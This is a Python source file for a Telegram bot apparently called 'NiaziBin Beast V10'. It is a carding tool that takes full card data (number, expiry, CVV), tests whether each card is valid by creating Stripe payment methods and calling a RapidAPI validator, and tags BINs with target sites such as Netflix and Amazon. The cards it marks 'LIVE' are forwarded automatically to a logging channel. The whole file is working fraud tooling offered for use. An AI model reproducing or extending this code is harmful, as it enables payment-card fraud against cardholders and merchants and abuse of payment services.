import os, telebot, requests, time, stripe, random
from telebot import types 
from flask import Flask
from threading import Thread

# --- Railway Health Check ---
app = Flask('')
@app.route('/')
def home(): return "NiaziBin Beast V10 is Online"

def run():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

def keep_alive():
    Thread(target=run).start()

# --- Configuration (Railway Variables) ---
TOKEN = os.getenv("TOKEN")
RAPID_KEY = os.getenv("RAPIDAPI_KEY")
STRIPE_SK = os.getenv("STRIPE_SK")
ADMIN_ID = 123456789 # <--- Apni ID dalo
LOG_CHANNEL = -100123456789 # <--- Live hits yahan milenge

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# --- Hot BINs Database (Site Specific) ---
HOT_DB = {
    "411111": "Netflix ✅", "489504": "Amazon ✅", "549184": "Google Play ✅"
}

# --- 100% True BIN API ---
def get_bin(cc):
    try:
        r = requests.get(f"https://data.handyapi.com/bin/{cc[:6]}").json()
        return f"{r.get('Bank', 'N/A')} | {r.get('Country', {}).get('Name', 'N/A')}"
    except: return "N/A"

@bot.message_handler(commands=['chk'])
def chk_handler(message):
    start_time = time.time()
    input_data = message.text.replace('/chk', '').strip()
    if "|" not in input_data: return bot.reply_to(message, "❌ Format: cc|mm|yy|cvv")
    
    msg = bot.reply_to(message, "<b>⌛ Bypassing Multi-Gateways... ♻️</b>")
    cc = input_data.split('|')[0]
    bin_info = get_bin(cc)
    site_tag = HOT_DB.get(cc[:6], "General Site")

    status, gateway, icon = "DEAD", "RapidAPI-V2", "❌"

    # --- STRIPE MULTI-GATEWAY ---
    if STRIPE_SK:
        try:
            stripe.api_key = STRIPE_SK
            p = input_data.split('|')
            # Auth Attempt
            stripe.PaymentMethod.create(type="card", card={"number":p[0],"exp_month":int(p[1]),"exp_year":int(p[2]),"cvc":p[3]})
            status, gateway, icon = "LIVE / HIT 🔥", "Stripe-Elite", "✅"
        except Exception as e:
            if "declined" in str(e): status = "DECLINED"
            else:
                # Backup Gateway
                try:
                    headers = {"X-RapidAPI-Key": RAPID_KEY, "X-RapidAPI-Host": "credit-card-validator2.p.rapidapi.com"}
                    r = requests.post("https://credit-card-validator2.p.rapidapi.com/validate-credit-card", json={"cardNumber":cc}, headers=headers).json()
                    status, icon = ("LIVE", "✅") if r.get('isValid') else ("DEAD", "❌")
                except: status = "API ERROR"

    time_taken = round(time.time() - start_time, 2)
    res = (f"{icon} <b>STATUS: {status}</b>\n━━━━━━━━━━━━\n💳 <b>Card:</b> <code>{input_data}</code>\n🏦 <b>Bin:</b> <code>{bin_info}</code>\n🎯 <b>Site:</b> <code>{site_tag}</code>\n⚡ <b>Gate:</b> <code>{gateway}</code>\n⏱️ <b>Time:</b> <code>{time_taken}s</code>")
    bot.edit_message_text(res, message.chat.id, msg.message_id)

    # --- FEATURE: Auto-Forward Scraper ---
    if "LIVE" in status:
        bot.send_message(LOG_CHANNEL, f"🔥 <b>LIVE HIT!</b>\nCC: <code>{input_data}</code>\nBIN: {bin_info}")

if __name__ == "__main__":
    keep_alive()
    bot.delete_webhook() # Fixes Conflict 409
    bot.infinity_polling()
